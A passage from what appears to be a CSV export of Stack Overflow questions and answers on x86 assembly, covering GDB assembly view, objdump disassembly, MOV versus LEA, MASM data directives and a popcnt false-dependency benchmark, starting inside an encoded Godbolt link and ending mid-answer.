KUpDRlj%2BF6SeS58LFmrmwNoIDdSgOXK/HessP7lhPrFII/1yooNLqlPCwxcL12WIsCigxxzQV5IBPI4JNiMByBwIoF9d77xeOwOI%2BRU7EEMEePQgjLhrjWmBMSh1Wz/FQAQIgEgURokFjQ1QdRfieDJDZfgjB0AZxKPmYROQ2Tfkus8Rw2cW7EAgEmKS85ZCFmXHgN04UtGI2RmWFBKC8BkMrKUFQah/CgX4LUTE4I25iXOMIFEfx%2BDaxdkCJO3wVp/F0OgLEpjzHmIXkvFe6h16bzrpkYAMibKHT8LOb8jB0ynnLH%2BXkKTgihCgbiSeHDyxZOXqvDejxUqtPnlMReHTcldLLnvNp/TsmdPyT0zBYyBk5Lyd0/OjpKI0QSjxPidoHCpnfrMiZQypn51GX0uZkzFk7OOXshZIz97tPmcM6Z08fKuGIl/eK3EkpTELGMTS5zbmnOubswZVyHlHL%2Bfss5vSwXAqWXqJ5LyVlcUSrxZKXz%2BLNUheMoF9zDk3MxXcg5vy8X/JBbik54Ky7eSZs83pL5kDpl3CIYgBAIBvKRRs80IEBIol1DqMJdQgFEBstCUEPKIXq3MZkWl9LWF%2BGZc4ypP0UYgXAYg7lOpeVsFEvy0a%2BQEkcDYDwnSBBhqBX0AQUVAKlprBVQmMAYAQLytcZgbxjhApMPUnqg10h8i5F0GPcMME6UMtlaHCA5zrp%2BHUm6bGPK%2BV6ILJ6w1Eg4zDXlRzaK6CL7qpGTMpWvo9T2lio6n6lqgEeNitTf6xakaalgfXKYIx1AKWJPoIEcJWF4AkDWhs0k/ZNE2NsfKBxjhSTOG2GWz83BWM4GbehwEdTJlPnmjlsVjq4zOk6zyubJoTinDOfsyDkHTPMSkEh9RjaYAgDgrGq6Hobp%2BmKg22dMjDBqNedRmBfBBCgfoJUFQs7ZxtlXKEMJlbpiehhHgCd0yFTcrUK9YrzE4MLYW4sIGHxq3MWWo9aH44FJJugG0QJ7bSSTnPU4UjPzQKnl5Ei/F674A4H6rmx4OyhM1e3O4FSzQADEI6TRfTZFa7Bwx8kPKiMknbfaEko2PVAE8fC6CEGapwgIwQ4ypDSADhsL1rGQxp%2BGm687nKnbU/cc7cLZlzDqjxR6YVf1oAxtwNwcgFk9BnYAHgEh8NbNJGWV8/LDBshAPUWbIy0G6ShxzacqBCnyGtC%2BBb83DC6n5ELYWIv5uwI53%2BsUr1ZYi8A5cJ8QH0bWJ0SIDc8ASlKDKOU8RUScGqGQc9r4mjMh3JiBIeqHDUytHyE4M7cRnno2nJyW6/IzDROCBAP4vDHiUH424ks3ad13BIT8u51HFBbQYOaKprBOF5rN9AqQJpCkuPlLQ%2Bx1BhA0YzTcgRRbYmioiCTOQgSzZ4ERvTKCIsok894TufAXoNPnt0Q4jWvB4lQNVzuepwSLZEwWbo2AroUa9QkZAQh4wD1DOcA2u3QDA2svWCxDgZidD6LSeNBAQB6mQBAVHohcJsBAKmBMTO0e1UeHhLQSxSEoOu7diAOpHggNEMMYYKCbthD8i0ZAClaC8qYN5tOlPqcQx1fTxnzPWfs858znnp7%2BeLEFyA4XYRRfi5XtzzLE1IzDD6LYToa9ugKQZ5%2BTAwsLuDFl8rWgpOUS0DaBNKY0ITg5QqBCYWpIry8kQZiFEHZgQVEsId9c1JXwvRpxT6blQccJ9RJIeoAhvuClJJ0GY1FwR2i0Dx8nluocOElxg%2B%2B5yFYlzYIwHLuCiv8UtZ3scbBIqNmPgVwfmsxw0h/nlrNyZMt1olY4ZNKqgQRISAhIOK01DzZsp7fwQtfHlHUodRgMTR0SeYZ%2B1gQoCj%2BECFEi/0l3Bzw7HSDvSZFYEGUMrGfK1eN2we9Q4SxLUcFiwR8oQo1Ssf9GBS0dUitOV%2B9/9zVpkAsJo%2BghF55WwBBQR8hPYgkvA/hLgmAWBk0eAUR9FVBnZW0rhqsvdZE/B5dWg0VSc1d1INcacdYdcucWdsEQBDIExZcUEq9qIUEjc9QbdLdrcZdbt%2BMMkh8fUv1x8ksC1aBMMMlrYv8S4MB0AqllCQJ8tVDssGpSsStlx1Dj1ND/JFCuNKhZ9ix8sF1F8wZrD/JwC7DZ8G9dD9DcgQDP1cgNC3DsNQFUZ%2B90Ip8CATAUD8MaDXZSMAI/hm8etA5g4UkvBCFXtUBGEthqkRBQxoheQsQUQ%2B0JN/cmNAJzBgxWw4x548gahBhDgKJutuFvUTwO4u0gxeR2h29aMagv5SxGQV9sQSBARTgB4qpXwSiDoL9YDFN/Bc8JB%2BBhoD9SR1t5DroEDy0wjCEnCF9ENrCPC9jCtACjCotTDit%2B9HMFJEsosKVYUWRNQhiOYuRMAeQxNdDgh1IAi2AUQIgogYg5pRjPMgweB0kNdm04lbAFcHBBCo5udJD%2B9pCxd%2B9ZcIBZAJsjkjiStBITi9QG8r074HACFStCsFJCSst%2BJH0jkQjOV7i4U5Z/JT1pc%2BiqUnYrMRFuNd5xUnY%2Bhvw7V5Cv4KSV1UYAETNQhhStAqTw0IZI1MYY11UPC7FXBJQDMxZSiNhlYeV5TzQVYdSpS4hM1DSSVywcgCBBAiQbMrDJpmSI5mSnYjZyhTZ9xnUngSEp5HREFnQTQ3QrRUk8A/haQEBfR0hrFk1Thp14t%2BFkAUQlQlNfpfolNgBvAxTGSgMxxk1NSQJ9Y0zIidINhHFrS4JbYOiADYpaAtIc1rZOBARfgvAchGBSzdZUYgirUIAky2hVDhgxcdkGymzlY4xYd2z%2BFvBX5wtX5Bciy%2BF0IazgA6zU84CixHYGzMYFz%2Bz3FD1IwGzeccUXicxvcti9YAVMgABNAQVaIIemD4Wops2wamYgn3UkIaJoEeWbUkPQAmVpJkRTZ0S4JOfgf1cWEo6EYaXsZY74ckQgExUZHzCIkKKuPAP/TtQgMsRCzZfsxwZqWBcEcELxYzXpLQ%2BCpCZWZCDURBS9LxS1SaIU16AtfM1MzBZ%2BfMki65JizMtC2KQs3cl%2Bd01pW0xk/i2WK6P0kAFASRaNXU9i/U4BambUiSqUzMzDUzGdczICLdLDcSldKUnldBLMTmN4tcK06XdVaSjkstLSmS3S3dLwCjcMtgfsIsOSiy6y6cEfBy1BPyPMXWG9A06QI0vyh5Xi0QaQMwHgGQQyBQNnaQWgBQVAGQLGTc8cdPV0fUGK0gOnOQEKswKUenJSVMVqTSPCVqVMNMAqvUWgPCPCUgMK6QVMBQKQEqWQUgKK%2BQBgGQBQLgJqjK0wUgOAWAJARbE/cgbgY/fxFAOJPUVqJq9wKDQoSgP4YwBQJQOdTQLERa0gfAHIQqPAfEdapMGoRaswUgwILgaQHkdAecOc/gWzcLRzcEYYVldZZKecSScEPoUWBwN6gdHYcEVwSkL8EQcEdbT69QD6ZNKwYMosNAHIHUEK6q8KyK9auKvy1Kruf2DYTSZMcENMOIoEPUWkVqWkVq7qrK0gHKnUTSZyQyVMWgVqEqEqZMVqAqnUeG2qxGzKtq6QDqkALqw63qmARAMSsofxYaiAQasa4AZMFmma3kfwea9a5aoCVazEdaza73FgXajm/amqnq469gU686y6tga6zc2gXqN6j6r6rYH6v6vwAGt44G8EUGz6iQHgNyZAAscECQP4LtamL2n2xCr28034ecDgKUTEK8d2OGmqiK5qpGmQaeRzDUzG7G3qGE5MZSBQEmkwbK%2BnVMIm1MPCWQM2vUSakqzSVMBdVmuq0gBqkGOOjm5G7m3mzKnO1m2Ghu1qpu9Kw6swSkNhdnIAA"" rel=""noreferrer"">on Godbolt</a>.  Don't use this version with clang; it does something silly with the defer-loop.  Using a tmp counter <code>k</code> and then adding it to <code>count</code> later changes what clang does, but that <em>slightly</em> hurts gcc.</p>

<p>See discussion in comments: Veedrac's code is <em>excellent</em> on CPUs with BMI1 (i.e. not Celeron/Pentium)</p>
","40355466"
"Show current assembly instruction in GDB","122664","","<p>I'm doing some assembly-level debugging in GDB. Is there a way to get GDB to show me the current assembly instruction in the same way that it shows the current source line? The default output after every command looks like this:</p>

<pre><code>0x0001433f      990         Foo::bar(p);
</code></pre>

<p>This gives me the address of the current instruction, but I have to keep referring back to the output of <code>disassemble</code> in order to see which instruction I'm currently executing.</p>
","<p>You can switch to assembly layout in GDB:</p>

<pre><code>(gdb) layout asm
</code></pre>

<p>See <a href=""http://sourceware.org/gdb/current/onlinedocs/gdb/TUI-Commands.html#TUI-Commands"" rel=""noreferrer"">here</a> for more information. The current assembly instruction will be shown in assembler window.</p>

<pre><code>   ┌───────────────────────────────────────────────────────────────────────────┐
   │0x7ffff740d756 &lt;__libc_start_main+214&gt;  mov    0x39670b(%rip),%rax        #│
   │0x7ffff740d75d &lt;__libc_start_main+221&gt;  mov    0x8(%rsp),%rsi              │
   │0x7ffff740d762 &lt;__libc_start_main+226&gt;  mov    0x14(%rsp),%edi             │
   │0x7ffff740d766 &lt;__libc_start_main+230&gt;  mov    (%rax),%rdx                 │
   │0x7ffff740d769 &lt;__libc_start_main+233&gt;  callq  *0x18(%rsp)                 │
  &gt;│0x7ffff740d76d &lt;__libc_start_main+237&gt;  mov    %eax,%edi                   │
   │0x7ffff740d76f &lt;__libc_start_main+239&gt;  callq  0x7ffff7427970 &lt;exit&gt;       │
   │0x7ffff740d774 &lt;__libc_start_main+244&gt;  xor    %edx,%edx                   │
   │0x7ffff740d776 &lt;__libc_start_main+246&gt;  jmpq   0x7ffff740d6b9 &lt;__libc_start│
   │0x7ffff740d77b &lt;__libc_start_main+251&gt;  mov    0x39ca2e(%rip),%rax        #│
   │0x7ffff740d782 &lt;__libc_start_main+258&gt;  ror    $0x11,%rax                  │
   │0x7ffff740d786 &lt;__libc_start_main+262&gt;  xor    %fs:0x30,%rax               │
   │0x7ffff740d78f &lt;__libc_start_main+271&gt;  callq  *%rax                       │
   └───────────────────────────────────────────────────────────────────────────┘
multi-thre process 3718 In: __libc_start_main     Line: ??   PC: 0x7ffff740d76d
#3  0x00007ffff7466eb5 in _IO_do_write () from /lib/x86_64-linux-gnu/libc.so.6
#4  0x00007ffff74671ff in _IO_file_overflow ()
   from /lib/x86_64-linux-gnu/libc.so.6
#5  0x0000000000408756 in ?? ()
#6  0x0000000000403980 in ?? ()
#7  0x00007ffff740d76d in __libc_start_main ()
   from /lib/x86_64-linux-gnu/libc.so.6
(gdb)
</code></pre>
","2015523"
"Assembly code vs Machine code vs Object code?","117063","","<p>What is the difference between object code, machine code and assembly code?</p>

<p>Can you give a visual example of their difference?</p>
","<p>Machine code is binary (1's and 0's) code that can be executed directly by the CPU.  If you were to open a ""machine code"" file in a text editor you would see garbage, including unprintable characters (no, not <em>those</em> unprintable characters ;)).</p>

<p>Object code is a portion of machine code that hasn't yet been linked into a complete program.  It's the machine code for one particular library or module that will make up the completed product.  It may also contain placeholders or offsets not found in the machine code of a completed program that the linker will use to connect everything together.</p>

<p>Assembly code is plain-text and (somewhat) human read-able source code that has a mostly direct 1:1 analog with machine instructions.  This is accomplished using mnemonics for the actual instructions/registers/other resources.  Examples include things like <code>JMP</code> or <code>MULT</code> for the jump and multiplication instructions. Unlike Machine Code, the CPU does not understand Assembly Code.</p>
","466811"
"Using GCC to produce readable assembly?","116312","","<p>I was wondering how to use <a href=""http://en.wikipedia.org/wiki/GNU_Compiler_Collection"" rel=""noreferrer"">GCC</a> on my C source file to dump a mnemonic version of the machine code so I could see what my code was being compiled into. You can do this with Java but I haven't been able to find a way with GCC.</p>

<p>I am trying to re-write a C method in assembly and seeing how GCC does it would be a big help.</p>
","<p>If you compile with debug symbols, you can use <code>objdump</code> to produce a more readable disassembly.</p>

<pre><code>&gt;objdump --help
[...]
-S, --source             Intermix source code with disassembly
-l, --line-numbers       Include line numbers and filenames in output
</code></pre>

<hr>

<p>Example:</p>

<pre><code>&gt; gcc -g -c test.c
&gt; objdump -d -M intel -S test.o

test.o:     file format elf32-i386


Disassembly of section .text:

00000000 &lt;main&gt;:
#include &lt;stdio.h&gt;

int main(void)
{
   0:   55                      push   ebp
   1:   89 e5                   mov    ebp,esp
   3:   83 e4 f0                and    esp,0xfffffff0
   6:   83 ec 10                sub    esp,0x10
    puts(""test"");
   9:   c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
  10:   e8 fc ff ff ff          call   11 &lt;main+0x11&gt;

    return 0;
  15:   b8 00 00 00 00          mov    eax,0x0
}
  1a:   c9                      leave  
  1b:   c3                      ret
</code></pre>
","1289907"
"What's the difference between a word and byte?","113936","","<p>I've done some research.
A byte is 8 bits and a word is the smallest unit that can be addressed on memory. The exact length of a word varies. What I don't understand is what's the point of having a byte? Why not say 8 bits?</p>

<p>I asked a prof this question and he said most machines these days are byte-addressable, but what would that make a word?</p>
","<p><strong>Byte</strong>: Today, a byte is almost always 8 bit. However, that <a href=""http://en.wikipedia.org/wiki/Byte"" rel=""noreferrer"">wasn't always the case</a> and there's no ""standard"" or something that dictates this. Since 8 bits is a  convenient number to work with it became the de facto standard.</p>

<p><strong>Word</strong>: The <a href=""http://en.wikipedia.org/wiki/Word_(computer_architecture)"" rel=""noreferrer"">natural size with which a processor is handling data</a> (the register size). The most common word sizes encountered today are 8, 16, 32 and 64 bits, but other sizes are possible. For examples, there were a few <a href=""http://en.wikipedia.org/wiki/36-bit"" rel=""noreferrer"">36 bit machines</a>, or even <a href=""http://en.wikipedia.org/wiki/12-bit"" rel=""noreferrer"">12 bit machines</a>.</p>

<p>The <strong>byte</strong> is the smallest addressable unit for a CPU. If you want to set/clear single bits, you first need to fetch the corresponding byte from memory, mess with the bits and then write the byte back to memory.</p>

<p>The <strong>word</strong> by contrast is biggest chunk of bits with which a processor can do processing (like addition and subtraction) at a time. That definition is a bit fuzzy, as some processor might have different word sizes for different tasks (integer vs. floating point processing for example). The word size is what the <em>majority</em> of operations work with.</p>

<p>There are also a few processors who have a different <em>pointer</em> size: for example, the 8086 is a 16-bit processor which means its registers are 16 bit wide. But its pointers (addresses) are 20 bit wide and were calculated by combining two 16 bit registers in a certain way.</p>
","7750439"
"What is the difference between MOV and LEA?","112633","","<p>I would like to know what the difference between these instructions is:</p>

<pre><code>MOV AX, [TABLE-ADDR]
</code></pre>

<p>and </p>

<pre><code>LEA AX, [TABLE-ADDR]
</code></pre>
","<ul>
<li>LEA means Load Effective Address</li>
<li>MOV means Load Value</li>
</ul>

<p>In short, LEA loads a pointer to the item you're addressing whereas MOV loads the actual value at that address.</p>

<p>The purpose of LEA is to allow one to perform a non-trivial address calculation and store the result [for later usage]</p>

<pre><code>LEA ax, [BP+SI+5] ; Compute address of value

MOV ax, [BP+SI+5] ; Load value at that address
</code></pre>

<p>Where there are just constants involved, MOV (through the assembler's constant calculations) can sometimes appear to overlap with the simplest cases of usage of LEA. Where its useful is if you have a multi-part calculation with multiple base addresses etc.</p>
","1699778"
"Purpose of ESI & EDI registers?","111515","","<p>What is the actual purpose and use of the EDI &amp; ESI registers in assembler?</p>

<p>I know they are used for string operations for one thing.</p>

<p>Can someone also give an example?</p>
","<p>There are a few operations you can <em>only</em> do with DI/SI (or their extended counterparts, if you didn't learn ASM in 1985). Among these are</p>

<pre><code>REP STOSB
REP MOVSB
REP SCASB
</code></pre>

<p>Which are, respectively, operations for repeated (= mass) storing, loading and scanning. What you do is you set up SI and/or DI to point at one or both operands, perhaps put a count in CX and then let 'er rip. These are operations that work on a bunch of bytes at a time, and they kind of put the CPU in automatic. Because you're not explicitly coding loops, they do their thing more efficiently (usually) than a hand-coded loop.</p>

<p>Just in case you're wondering: Depending on how you set the operation up, repeated storing can be something simple like punching the value 0 into a large contiguous block of memory; MOVSB is used, I think, to copy data from one buffer (well, any bunch of bytes) to another; and SCASB is used to look for a byte that matches some search criterion (I'm not sure if it's only searching on equality, or what &ndash; you can look it up :) )</p>

<p>That's most of what those regs are for.</p>
","1856352"
"x86 assembly - Which variable size to use (db, dw, dd)","107320","","<p>I am a beginner to assembly and I don't know what all the db, dw, dd, things mean.
I have tried to write this little script that does 1+1, stores it in a variable and then displays the result. Here is my code so far:</p>

<pre><code>.386
.model flat, stdcall 
option casemap :none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
.data
num db ? ; set variable . Here is where I don't know what data type to use.
.code
start:
mov eax, 1               ; add 1 to eax register
mov ebx, 1               ; add 1 to ebx register
add eax, ebx             ; add registers eax and ebx
push eax                 ; push eax into the stack
pop num                  ; pop eax into the variable num (when I tried it, it gave me an error, i think  thats because of the data type)
invoke StdOut, addr num  ; display num on the console.
invoke ExitProcess       ; exit
end start
</code></pre>

<p>I need to understand what the db, dw, dd things mean and how they affect variable setting and combining and that sort of thing.</p>

<p>Thanks in advance,
Progrmr </p>
","<p><strong>DB</strong> - Define Byte. 8 bits</p>

<p><strong>DW</strong> - Define Word. Generally 2 bytes on a typical x86 32-bit system</p>

<p><strong>DD</strong> - Define double word. Generally 4 bytes on a typical x86 32-bit system</p>

<p>From <a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html"" rel=""noreferrer"">x86 assembly tutorial</a>,</p>

<blockquote>
  <p>The pop instruction <strong>removes the 4-byte data element from the top of
  the hardware-supported stack</strong> into the specified operand (i.e. register
  or memory location). It first moves the 4 bytes located at memory
  location [SP] into the specified register or memory location, and then
  increments SP by 4.</p>
</blockquote>

<p>Your num is 1 byte. Try declaring it with <code>DD</code> so that it becomes 4 bytes and matches with <code>pop</code> semantics.</p>
","10168788"
"Replacing a 32-bit loop count variable with 64-bit introduces crazy performance deviations","100863","","<p>I was looking for the fastest way to <code>popcount</code> large arrays of data. I encountered a <em>very weird</em> effect: Changing the loop variable from <code>unsigned</code> to <code>uint64_t</code> made the performance drop by 50% on my PC.</p>

<h2>The Benchmark</h2>

<pre><code>#include &lt;iostream&gt;
#include &lt;chrono&gt;
#include &lt;x86intrin.h&gt;

int main(int argc, char* argv[]) {

    using namespace std;
    if (argc != 2) {
       cerr &lt;&lt; ""usage: array_size in MB"" &lt;&lt; endl;
       return -1;
    }

    uint64_t size = atol(argv[1])&lt;&lt;20;
    uint64_t* buffer = new uint64_t[size/8];
    char* charbuffer = reinterpret_cast&lt;char*&gt;(buffer);
    for (unsigned i=0; i&lt;size; ++i)
        charbuffer[i] = rand()%256;

    uint64_t count,duration;
    chrono::time_point&lt;chrono::system_clock&gt; startP,endP;
    {
        startP = chrono::system_clock::now();
        count = 0;
        for( unsigned k = 0; k &lt; 10000; k++){
            // Tight unrolled loop with unsigned
            for (unsigned i=0; i&lt;size/8; i+=4) {
                count += _mm_popcnt_u64(buffer[i]);
                count += _mm_popcnt_u64(buffer[i+1]);
                count += _mm_popcnt_u64(buffer[i+2]);
                count += _mm_popcnt_u64(buffer[i+3]);
            }
        }
        endP = chrono::system_clock::now();
        duration = chrono::duration_cast&lt;std::chrono::nanoseconds&gt;(endP-startP).count();
        cout &lt;&lt; ""unsigned\t"" &lt;&lt; count &lt;&lt; '\t' &lt;&lt; (duration/1.0E9) &lt;&lt; "" sec \t""
             &lt;&lt; (10000.0*size)/(duration) &lt;&lt; "" GB/s"" &lt;&lt; endl;
    }
    {
        startP = chrono::system_clock::now();
        count=0;
        for( unsigned k = 0; k &lt; 10000; k++){
            // Tight unrolled loop with uint64_t
            for (uint64_t i=0;i&lt;size/8;i+=4) {
                count += _mm_popcnt_u64(buffer[i]);
                count += _mm_popcnt_u64(buffer[i+1]);
                count += _mm_popcnt_u64(buffer[i+2]);
                count += _mm_popcnt_u64(buffer[i+3]);
            }
        }
        endP = chrono::system_clock::now();
        duration = chrono::duration_cast&lt;std::chrono::nanoseconds&gt;(endP-startP).count();
        cout &lt;&lt; ""uint64_t\t""  &lt;&lt; count &lt;&lt; '\t' &lt;&lt; (duration/1.0E9) &lt;&lt; "" sec \t""
             &lt;&lt; (10000.0*size)/(duration) &lt;&lt; "" GB/s"" &lt;&lt; endl;
    }

    free(charbuffer);
}
</code></pre>

<p>As you see, we create a buffer of random data, with the size being <code>x</code> megabytes where <code>x</code> is read from the command line. Afterwards, we iterate over the buffer and use an unrolled version of the x86 <code>popcount</code> intrinsic to perform the popcount. To get a more precise result, we do the popcount 10,000 times. We measure the times for the popcount. In the upper case, the inner loop variable is <code>unsigned</code>, in the lower case, the inner loop variable is <code>uint64_t</code>. I thought that this should make no difference, but the opposite is the case.</p>

<h2>The (absolutely crazy) results</h2>

<p>I compile it like this (g++ version: Ubuntu 4.8.2-19ubuntu1):</p>

<pre><code>g++ -O3 -march=native -std=c++11 test.cpp -o test
</code></pre>

<p>Here are the results on my <a href=""http://en.wikipedia.org/wiki/Haswell_%28microarchitecture%29"" rel=""noreferrer"">Haswell</a> <a href=""http://en.wikipedia.org/wiki/Haswell_%28microarchitecture%29#Desktop_processors"" rel=""noreferrer"">Core i7-4770K</a> CPU @ 3.50&nbsp;GHz, running <code>test 1</code> (so 1&nbsp;MB random data):</p>

<ul>
<li>unsigned  41959360000  0.401554 sec   <strong>26.113&nbsp;GB/s</strong></li>
<li>uint64_t  41959360000  0.759822 sec   <strong>13.8003&nbsp;GB/s</strong></li>
</ul>

<p>As you see, the throughput of the <code>uint64_t</code> version is <strong>only half</strong> the one of the <code>unsigned</code> version! The problem seems to be that different assembly gets generated, but why? First, I thought of a compiler bug, so I tried <code>clang++</code> (Ubuntu <a href=""http://en.wikipedia.org/wiki/Clang"" rel=""noreferrer"">Clang</a> version 3.4-1ubuntu3):</p>

<pre><code>clang++ -O3 -march=native -std=c++11 teest.cpp -o test
</code></pre>

<p>Result: <code>test 1</code></p>

<ul>
<li>unsigned  41959360000  0.398293 sec   <strong>26.3267 GB/s</strong></li>
<li>uint64_t  41959360000  0.680954 sec   <strong>15.3986 GB/s</strong></li>
</ul>

<p>So, it is almost the same result and is still strange. <em>But now it gets super strange.</em> I replace the buffer size that was read from input with a constant <code>1</code>, so I change:</p>

<pre><code>uint64_t size = atol(argv[1]) &lt;&lt; 20;
</code></pre>

<p>to</p>

<pre><code>uint64_t size = 1 &lt;&lt; 20;
</code></pre>

<p>Thus, the compiler now knows the buffer size at compile time. Maybe it can add some optimizations! Here are the numbers for <code>g++</code>:</p>

<ul>
<li>unsigned  41959360000  0.509156 sec   <strong>20.5944&nbsp;GB/s</strong></li>
<li>uint64_t  41959360000  0.508673 sec   <strong>20.6139&nbsp;GB/s</strong></li>
</ul>

<p>Now, both versions are equally fast. However, the <code>unsigned</code> <strong>got even slower</strong>! It dropped from <code>26</code> to <code>20 GB/s</code>, thus replacing a non-constant by a constant value lead to a <strong>deoptimization</strong>. Seriously, I have no clue what is going on here! But now to <code>clang++</code> with the new version:</p>

<ul>
<li>unsigned  41959360000  0.677009 sec   <strong>15.4884&nbsp;GB/s</strong></li>
<li>uint64_t  41959360000  0.676909 sec   <strong>15.4906&nbsp;GB/s</strong></li>
</ul>

<p><em>Wait, what?</em> Now, both versions dropped to the <strong>slow</strong> number of 15&nbsp;GB/s. Thus, replacing a non-constant by a constant value even lead to slow code in <strong>both</strong> cases for Clang!</p>

<p>I asked a colleague with an <a href=""http://en.wikipedia.org/wiki/Ivy_Bridge_%28microarchitecture%29"" rel=""noreferrer"">Ivy Bridge</a> CPU to compile my benchmark. He got similar results, so it does not seem to be Haswell. Because two compilers produce strange results here, it also does not seem to be a compiler bug. We do not have an AMD CPU here, so we could only test with Intel.</p>

<h2>More madness, please!</h2>

<p>Take the first example (the one with <code>atol(argv[1])</code>) and put a <code>static</code> before the variable, i.e.:</p>

<pre><code>static uint64_t size=atol(argv[1])&lt;&lt;20;
</code></pre>

<p>Here are my results in g++:</p>

<ul>
<li>unsigned  41959360000  0.396728 sec   <strong>26.4306 GB/s</strong></li>
<li>uint64_t  41959360000  0.509484 sec   <strong>20.5811 GB/s</strong></li>
</ul>

<p><em>Yay, yet another alternative</em>. We still have the fast 26&nbsp;GB/s with <code>u32</code>, but we managed to get <code>u64</code> at least from the 13&nbsp;GB/s to the 20&nbsp;GB/s version! <strong>On my collegue's PC, the <code>u64</code> version became even faster than the <code>u32</code> version, yielding the fastest result of all.</strong> Sadly, this only works for <code>g++</code>, <code>clang++</code> does not seem to care about <code>static</code>.</p>

<h2>My question</h2>

<p>Can you explain these results? Especially:</p>

<ul>
<li>How can there be such a difference between <code>u32</code> and <code>u64</code>?</li>
<li>How can replacing a non-constant by a constant buffer size trigger <em>less optimal code</em>?</li>
<li>How can the insertion of the <code>static</code> keyword make the <code>u64</code> loop faster? Even faster than the original code on my collegue's computer!</li>
</ul>

<p>I know that optimization is a tricky territory, however, I never thought that such small changes can lead to a <strong>100% difference</strong> in execution time and that small factors like a constant buffer size can again mix results totally. Of course, I always want to have the version that is able to popcount 26&nbsp;GB/s. The only reliable way I can think of is copy paste the assembly for this case and use inline assembly. This is the only way I can get rid of compilers that seem to go mad on small changes. What do you think? Is there another way to reliably get the code with most performance?</p>

<h2>The Disassembly</h2>

<p>Here is the disassembly for the various results:</p>

<p>26&nbsp;GB/s version from <strong>g++ / u32 / non-const bufsize</strong>:</p>

<pre><code>0x400af8:
lea 0x1(%rdx),%eax
popcnt (%rbx,%rax,8),%r9
lea 0x2(%rdx),%edi
popcnt (%rbx,%rcx,8),%rax
lea 0x3(%rdx),%esi
add %r9,%rax
popcnt (%rbx,%rdi,8),%rcx
add $0x4,%edx
add %rcx,%rax
popcnt (%rbx,%rsi,8),%rcx
add %rcx,%rax
mov %edx,%ecx
add %rax,%r14
cmp %rbp,%rcx
jb 0x400af8
</code></pre>

<p>13&nbsp;GB/s version from <strong>g++ / u64 / non-const bufsize</strong>:</p>

<pre><code>0x400c00:
popcnt 0x8(%rbx,%rdx,8),%rcx
popcnt (%rbx,%rdx,8),%rax
add %rcx,%rax
popcnt 0x10(%rbx,%rdx,8),%rcx
add %rcx,%rax
popcnt 0x18(%rbx,%rdx,8),%rcx
add $0x4,%rdx
add %rcx,%rax
add %rax,%r12
cmp %rbp,%rdx
jb 0x400c00
</code></pre>

<p>15&nbsp;GB/s version from <strong>clang++ / u64 / non-const bufsize</strong>:</p>

<pre><code>0x400e50:
popcnt (%r15,%rcx,8),%rdx
add %rbx,%rdx
popcnt 0x8(%r15,%rcx,8),%rsi
add %rdx,%rsi
popcnt 0x10(%r15,%rcx,8),%rdx
add %rsi,%rdx
popcnt 0x18(%r15,%rcx,8),%rbx
add %rdx,%rbx
add $0x4,%rcx
cmp %rbp,%rcx
jb 0x400e50
</code></pre>

<p>20&nbsp;GB/s version from <strong>g++ / u32&amp;u64 / const bufsize</strong>:</p>

<pre><code>0x400a68:
popcnt (%rbx,%rdx,1),%rax
popcnt 0x8(%rbx,%rdx,1),%rcx
add %rax,%rcx
popcnt 0x10(%rbx,%rdx,1),%rax
add %rax,%rcx
popcnt 0x18(%rbx,%rdx,1),%rsi
add $0x20,%rdx
add %rsi,%rcx
add %rcx,%rbp
cmp $0x100000,%rdx
jne 0x400a68
</code></pre>

<p>15&nbsp;GB/s version from <strong>clang++ / u32&amp;u64 / const bufsize</strong>:</p>

<pre><code>0x400dd0:
popcnt (%r14,%rcx,8),%rdx
add %rbx,%rdx
popcnt 0x8(%r14,%rcx,8),%rsi
add %rdx,%rsi
popcnt 0x10(%r14,%rcx,8),%rdx
add %rsi,%rdx
popcnt 0x18(%r14,%rcx,8),%rbx
add %rdx,%rbx
add $0x4,%rcx
cmp $0x20000,%rcx
jb 0x400dd0
</code></pre>

<p>Interestingly, the fastest (26&nbsp;GB/s) version is also the longest! It seems to be the only solution that uses <code>lea</code>. Some versions use <code>jb</code> to jump, others use <code>jne</code>. But apart from that, all versions seem to be comparable. I don't see where a 100% performance gap could originate from, but I am not too adept at deciphering assembly. The slowest (13&nbsp;GB/s) version looks even very short and good. Can anyone explain this?</p>

<h2>Lessons learned</h2>

<p>No matter what the answer to this question will be; I have learned that in really hot loops <em>every</em> detail can matter, <em>even details that do not seem to have any association to the hot code</em>. I have never thought about what type to use for a loop variable, but as you see such a minor change can make a <em>100%</em> difference! Even the storage type of a buffer can make a huge difference, as we saw with the insertion of the <code>static</code> keyword in front of the size variable! In the future, I will always test various alternatives on various compilers when writing really tight and hot loops that are crucial for system performance.</p>

<p>The interesting thing is also that the performance difference is still so high although I have already unrolled the loop four times. So even if you unroll, you can still get hit by major performance deviations. Quite interesting.</p>
","<p><strong>Culprit: False Data Dependency</strong> (and the compiler isn't even aware of it)</p>

<p>On Sandy/Ivy Bridge and Haswell processors, the instruction:</p>

<pre><code>popcnt  src, dest
</code></pre>

<p>appears to have a false dependency on the destination register <code>dest</code>. Even though the instruction only writes to it, the instruction will wait until <code>dest</code> is ready before executing.</p>

<p>This dependency doesn't just hold up the 4 <code>popcnt</code>s from a single loop iteration. It can carry across loop iterations making it impossible for the processor to parallelize different loop iterations.</p>

<p>The <code>unsigned</code> vs. <code>uint64_t</code> and other tweaks don't directly affect the problem. But they influence the register allocator which assigns the registers to the variables.</p>

<p>In your case, the speeds are a direct result of what is stuck to the (false) dependency chain depending on what the register allocator decided to do.</p>

<ul>
<li>13 GB/s has a chain: <code>popcnt</code>-<code>add</code>-<code>popcnt</code>-<code>popcnt</code> &rarr; next iteration</li>
<li>15 GB/s has a chain: <code>popcnt</code>-<code>add</code>-<code>popcnt</code>-<code>add</code> &rarr; next iteration</li>
<li>20 GB/s has a chain: <code>popcnt</code>-<code>popcnt</code> &rarr; next iteration</li>
<li>26 GB/s has a chain: <code>popcnt</code>-<code>popcnt</code> &rarr; next iteration</li>
</ul>

<p>The difference between 20 GB/s and 26 GB/s seems to be a minor artifact of the indirect addressing. Either way, the processor starts to hit other bottlenecks once you reach this speed.</p>

<hr>

<p>To test this, I used inline assembly to bypass the compiler and get exactly the assembly I want. I also split up the <code>count</code> variable to break all other dependencies that might mess with the benchmarks.</p>

<p>Here are the results:</p>

<p><strong>Sandy Bridge Xeon @ 3.5 GHz:</strong> (full test code can be found at the bottom)</p>

<ul>
